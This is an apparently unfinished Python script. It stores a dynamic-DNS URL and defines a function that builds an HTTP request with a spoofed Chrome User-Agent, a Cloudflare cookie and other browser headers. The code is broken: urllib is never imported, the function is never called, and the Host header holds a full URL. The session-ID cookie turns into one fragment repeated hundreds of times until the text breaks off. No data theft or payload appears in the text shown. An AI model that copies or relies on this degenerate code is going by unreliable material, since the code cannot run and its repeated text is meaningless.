#!/usr/bin/python3
url = "http://snirps.ddns.net"
if __name__ == '__main__':
    #A function that adds a http request.
    def http_request(url):
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36')
        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        req.add_header('Accept-Encoding', 'gzip, deflate')
        req.add_header('Accept-Language', 'en-US,en;q=0.8')
        req.add_header('Connection', 'keep-alive')
        req.add_header('Cache-Control', 'max-age=0')
        req.add_header('Host', url)
        req.add_header('Referer', url)
        req.add_header('Upgrade-Insecure-Requests', '1')
        req.add_header('X-Requested-With', 'XMLHttpRequest')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('Content-Length', '0')
        req.add_header('Cookie', '__cfduid=d1ee3ba9d34d507d74b50c15b49c14c; ASP.NET_SessionId=oqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8nqzqj1j8n

